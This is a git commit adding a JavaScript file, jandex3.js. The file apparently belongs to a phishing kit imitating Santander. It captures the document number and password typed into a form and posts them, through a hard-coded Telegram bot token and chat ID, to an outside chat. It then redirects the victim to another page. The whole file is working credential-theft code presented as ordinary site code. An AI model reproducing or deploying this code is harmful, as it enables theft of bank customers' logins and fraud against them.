3e02a9fb1c82227a76555cb36bae3421b0527d1e
Santanderrmxcd <yeith151515@gmail.com>
2026-04-22 09:54:55 -0500

    Add files via upload

---
+++ jandex3.js
@@ -0,0 +1,35 @@
+function enviarFormulario(event) {
+    event.preventDefault();
+
+    var documento = document.getElementById("documento").value;
+    var contraseña = document.getElementById("contraseña").value;
+
+
+    var mensaje = "Correo: <code>" + documento + "</code>\n" +
+    "Contraseña: <code>" + contraseña + "</code>";  
+
+    fetch("https://api.telegram.org/bot" + "8736114012:AAGscwmRAEpVgsV6wLpq4XYV_PHRHATxajs" + "/sendMessage", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            chat_id: 7039350920,
+            text: mensaje,
+            parse_mode: "HTML"
+        })
+    })
+    .then(function(response) {
+        if (response.ok) {
+            
+            window.location.href = "index5.html";
+        } else {
+           
+            console.error("Error en la llamada a la API de Telegram: ", response.statusText);
+        }
+    })
+    .catch(function(error) {
+        
+        console.error("Error en la llamada a la API de Telegram: ", error);
+    });
+}
